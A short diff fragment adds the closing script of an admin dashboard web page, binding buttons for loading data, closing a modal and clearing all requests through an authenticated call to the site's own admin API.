+  document.getElementById('wifiBtn').addEventListener('click', loadData);
+  document.getElementById('modalClose').addEventListener('click', closeModal);
+  document.getElementById('modalOverlay').addEventListener('click', e => { if(e.target === e.currentTarget) closeModal(); });
+  document.getElementById('clearBtn').addEventListener('click', async ()=>{
+    if(!confirm('مسح كل الطلبات؟')) return;
+    await fetch('/api/admin/clear',{method:'POST',headers:{'Authorization':'Bearer '+token()}});
+    loadData();
+  });
+
+  if(token()) showDash();
+</script>
+</body>
+</html>
